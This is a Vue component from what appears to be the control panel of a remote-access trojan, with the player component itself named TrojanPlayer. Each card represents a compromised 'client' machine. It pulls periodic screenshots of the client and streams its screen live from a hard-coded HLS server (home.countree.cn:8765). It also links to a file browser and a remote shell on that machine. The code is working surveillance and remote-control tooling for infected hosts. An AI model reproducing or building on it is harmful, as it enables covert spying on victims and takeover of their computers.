<template>
  <el-card
    class="mx-6"
    v-loading="cardLoading"
    :class="{ streaming: client.streaming }"
  >
    <template #header>
      <span>ID:</span> <span>{{ client.id }}</span>
    </template>
    <div class="flex items-start flex-col">
      <div class="flex justify-start mb-3">
        <template v-if="!client.streaming">
          <el-image
            :src="screenshotPreviewUrl"
            style="height: 100px"
            @click="refreshScreenshotPreview"
            v-loading="screenshotLoading"
          >
            <template #error>
              <div class="image-slot">
                <el-icon><icon-ic-outline-hide-image /></el-icon>
              </div>
            </template>
          </el-image>
        </template>

        <template v-else>
          <!--<el-icon
            :size="50"
            color="green"
            class="ml-10 relative right-0 bottom-0 streaming"
            @click="
              $router.push({
                name: 'PlayerView',
                params: {
                  src: `http://home.countree.cn:8765/hls/${client.id}.m3u8`,
                },
              })
            "
            ><icon-ic-baseline-play-circle-outline
          /></el-icon>
          <span>推流中</span>-->
          <TrojanPlayer
            :src="`http://home.countree.cn:8765/hls/${client.id}.m3u8`"
          ></TrojanPlayer>
        </template>
      </div>
      <div>
        <span>主机名: </span><span>{{ client.主机名 }}</span>
      </div>
      <div>
        <span>平台: </span><span>{{ client.系统版本名 }}</span>
      </div>
    </div>
    <div class="flex justify-end mt-2">
      <el-dropdown>
        <el-button>操作</el-button>
        <template #dropdown>
          <el-dropdown-menu>
            <el-dropdown-item @click="showClientDetails"
              >详细信息</el-dropdown-item
            >
            <el-dropdown-item @click="showScreenshot">截图</el-dropdown-item>
            <el-dropdown-item @click="toggleStream">推流</el-dropdown-item>
            <el-dropdown-item
              @click="
                $router.push({
                  name: 'FileExplorerView',
                  params: { id: client.id },
                })
              "
              >文件</el-dropdown-item
            >
            <el-dropdown-item
              @click="
                $router.push({ name: 'ShellView', params: { id: client.id } })
              "
              >终端</el-dropdown-item
            >
          </el-dropdown-menu>
        </template>
      </el-dropdown>
    </div>
  </el-card>
</template>

<script lang="ts">
import { container } from "@/plugins/inversify";
import { SocketioManager } from "@/plugins/socketio";
import { client } from "@/types/client";
import {
  defineComponent,
  getCurrentInstance,
  onActivated,
  onBeforeMount,
  onBeforeUnmount,
  PropType,
  ref,
} from "vue";
import { api as viewer } from "v-viewer";
import { Dialog } from "vant";
import TrojanPlayer from "./TrojanPlayer.vue";

export default defineComponent({
  props: {
    client: {
      type: Object as PropType<client>,
      required: true,
    },
  },
  setup(props) {
    const manager = container.resolve(SocketioManager);
    const cardLoading = ref(false);
    const screenshotPreviewUrl = ref("");
    const screenshotLoading = ref(false);
    const proxy = getCurrentInstance()?.proxy;
    setTimeout(() => {
      refreshScreenshotPreview();
    }, 0);
    const interval = setInterval(() => {
      refreshScreenshotPreview();
    }, 1000 * 60 * 1);
    onBeforeUnmount(() => {
      clearInterval(interval);
    });
    function showClientDetails() {
      function format() {
        let result = "";
        for (const key in props.client) {
          if (Object.hasOwnProperty.call(props.client, key)) {
            const element = props.client[key as keyof client];
            result += `${key}: ${element} \n`;
          }
        }
        return result;
      }
      Dialog({ message: format() });
    }
    async function refreshScreenshotPreview() {
      screenshotLoading.value = true;
      try {
        screenshotPreviewUrl.value = await manager.getScreenshotUrl(
          props.client.id
        );
      } catch (error) {
        console.log(error);
      } finally {
        screenshotLoading.value = false;
      }
    }
    async function showScreenshot() {
      cardLoading.value = true;
      try {
        const url = await manager.getScreenshotUrl(props.client.id);
        viewer({ options: {}, images: [url] });
        cardLoading.value = false;
      } catch (error) {
        console.log(error);
        cardLoading.value = false;
      }
    }
    function toggleStream() {
      props.client.streaming
        ? manager.stopStream(props.client.id)
        : manager.startStream(props.client.id);
    }

    onActivated(() => {
      console.log(`card onActivated`);
    });
    onBeforeMount(() => {
      console.log(`card onBeforeMount`);
    });

    return {
      showScreenshot,
      cardLoading,
      screenshotPreviewUrl,
      refreshScreenshotPreview,
      screenshotLoading,
      showClientDetails,
      toggleStream,
    };
  },
  components: { TrojanPlayer },
});
</script>

<style lang="scss" scoped>
.streaming {
  animation: streaming infinite alternate 1.5s;
}

@keyframes streaming {
  from {
  }
  to {
    background-color: rgba($color: green, $alpha: 0.1);
  }
}
</style>
